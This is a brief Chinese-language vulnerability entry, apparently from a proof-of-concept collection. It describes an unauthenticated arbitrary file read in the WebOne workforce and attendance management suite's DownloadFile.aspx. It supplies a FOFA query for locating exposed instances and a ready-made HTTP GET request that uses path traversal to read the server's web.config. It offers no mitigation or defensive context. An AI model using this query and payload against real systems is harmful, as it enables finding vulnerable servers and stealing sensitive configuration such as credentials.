## WebOne 劳动力与考勤管理套件 DownloadFile.aspx 任意文件读取漏洞

## WebOne 劳动力与考勤管理套件 DownloadFile.aspx 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。

## fofa
```
title="Webone-WTS劳动力管理套件"
```

## POC
```
GET /webForms/Download/DownloadFile.aspx?fileid=../../../web.config&flag=report HTTP/1.1
Host: [目标服务器域名或IP]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip
```

